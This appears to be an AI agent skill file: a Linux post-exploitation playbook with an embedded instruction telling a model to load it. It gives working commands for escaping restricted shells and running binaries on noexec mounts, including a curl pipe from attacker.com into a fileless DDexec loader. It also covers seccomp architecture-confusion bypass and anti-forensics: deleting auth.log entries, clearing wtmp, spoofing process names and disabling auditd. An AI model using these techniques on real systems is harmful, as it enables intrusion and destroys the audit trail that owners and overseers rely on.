---
name: linux-security-bypass
description: >-
  Linux security mechanism bypass playbook. Use when facing restricted bash/rbash, read-only or noexec filesystems, AppArmor, SELinux, seccomp filters, or audit logging that must be evaded during post-exploitation.
---

# SKILL: Linux Security Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for bypassing Linux security mechanisms. Covers restricted shell escape, noexec bypass, AppArmor/SELinux evasion, seccomp circumvention, and audit evasion. Base models miss DDexec, memfd_create fileless execution, and architecture-confusion seccomp bypass.

## 0. RELATED ROUTING

- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) once restrictions are broken
- [container-escape-techniques](../container-escape-techniques/SKILL.md) for container-specific security

---

## 1. RESTRICTED BASH (rbash) BYPASS

### 1.1 SSH-Based Bypass

```bash
ssh user@host -t "bash --noprofile --norc"
ssh user@host -t "/bin/sh"
sftp user@host  # often not restricted
```

### 1.2 Editor-Based Escape

```bash
vi -> :set shell=/bin/bash -> :shell
ed -> !/bin/bash
```

### 1.3 Language Interpreter Escape

| Interpreter | Command |
|---|---|
| Python | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Perl | `perl -e 'exec "/bin/bash";'` |
| Ruby | `ruby -e 'exec "/bin/bash"'` |
| AWK | `awk 'BEGIN {system("/bin/bash")}'` |

### 1.4 Environment Variable Tricks

```bash
BASH_CMDS[x]=/bin/bash; x
env /bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/bin/bash

git log --oneline --all -p   # git can read arbitrary files
```

---

## 2. READ-ONLY / NOEXEC FILESYSTEM EXECUTION

### 2.1 DDexec - Execute From stdin via /proc/self/mem

```bash
# Overwrites running process memory with new binary - completely fileless
curl -sL https://attacker.com/payload | bash ddexec.sh
```

### 2.2 memfd_create - In-Memory File Descriptor

```python
import ctypes, os
libc = ctypes.CDLL("libc.so.6")
fd = libc.syscall(319, b"", 0)     # SYS_MEMFD_CREATE (x86_64)
with open(f"/proc/self/fd/{fd}", "wb") as f:
    f.write(open("/path/to/binary", "rb").read())
os.execve(f"/proc/self/fd/{fd}", ["binary"], os.environ)   # Bypasses noexec
```

### 2.3 ld.so Direct Execution

```bash
/lib64/ld-linux-x86-64.so.2 /path/on/noexec/mount/binary
```

### 2.4 Script Interpreters on noexec

```bash
# Scripts still execute on noexec - only ELF execution is blocked
python3 /noexec/mount/exploit.py
perl /noexec/mount/exploit.pl
bash /noexec/mount/exploit.sh
```

### 2.5 Writable + Exec Locations

```bash
mount | grep -E "shm|tmp"  # Look for absence of "noexec"
# Common writable+exec: /dev/shm, /var/tmp, /run
```

---

## 3. APPARMOR BYPASS

```bash
aa-status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled
cat /proc/self/attr/current  # "unconfined" = no restriction

# Complain mode = no restriction (just logging)
ps auxZ 2>/dev/null | grep unconfined  # Unconfined processes
```

Gaps: `/proc/self/fd/*` access, interpreter-based execution (python scripts bypass binary restrictions), newly created paths.

---

## 4. SELINUX BYPASS

```bash
getenforce  # Enforcing / Permissive / Disabled
sestatus
id -Z && ps auxZ | head -20

semanage permissive -l 2>/dev/null  # Domains in permissive mode
getsebool -a | grep -i "on$" | grep -iE "exec|write|network"
```

---

## 5. SECCOMP BYPASS

```bash
grep Seccomp /proc/self/status
# 0=disabled, 1=strict, 2=filter
```

### Architecture Confusion (x86 vs x86_64)

```bash
# Seccomp filters check x86_64 syscall numbers, not x86
# x86_64 execve=59, x86 execve=11
# Filter blocks 59 but not 11
gcc -m32 -static -o exploit32 exploit.c
# If filter lacks AUDIT_ARCH_X86 check -> bypass
```

Allowed syscalls to abuse: `sendmsg/recvmsg` (pass FDs), `mmap/mprotect` (executable memory), `process_vm_readv/writev`.

Known bugs: CVE-2019-2054 (ptrace bypass), io_uring bypassed seccomp entirely (pre-5.12).

---

## 6. AUDIT EVASION

```bash
touch -r /etc/hosts /modified/file          # Copy timestamp
touch -t 202301010000.00 /modified/file     # Set specific timestamp

sed -i '/pattern/d' /var/log/auth.log       # Remove log entries
echo "" > /var/log/wtmp                     # Clear login records

# Process name spoofing:
exec -a "[kworker/0:0]" /bin/bash

# Disable audit (root required):
auditctl -e 0 && service auditd stop
```

---

## 7. DECISION TREE

```
Security mechanism identified?
|
|-- Restricted shell (rbash)?
|   |-- SSH access? -> ssh -t "bash --noprofile --norc" (S1.1)
|   |-- Editor available? -> vi :!/bin/bash (S1.2)
|   +-- Language interpreter? -> python/perl escape (S1.3)
|
|-- noexec filesystem?
|   |-- Script interpreters? -> bash/python/perl scripts work (S2.4)
|   |-- /dev/shm writable+exec? -> copy binary there (S2.5)
|   |-- memfd_create available? -> fileless execution (S2.2)
|   +-- Last resort -> DDexec via /proc/self/mem (S2.1)
|
|-- AppArmor enforcing?
|   |-- Complain mode? -> no restriction, just logging (S3)
|   +-- Unconfined processes? -> inject/migrate (S3)
|
|-- SELinux enforcing?
|   |-- Permissive domain? -> exploit that domain (S4)
|   +-- Dangerous booleans enabled? -> abuse allowed actions (S4)
|
|-- seccomp filter active?
|   |-- Architecture check missing? -> 32-bit syscall confusion (S5)
|   +-- Allowed syscalls exploitable? -> sendmsg/mmap abuse (S5)
|
+-- Audit logging?
    |-- Writable logs? -> delete/modify entries (S6)
    +-- Root access? -> disable auditd (S6)
```
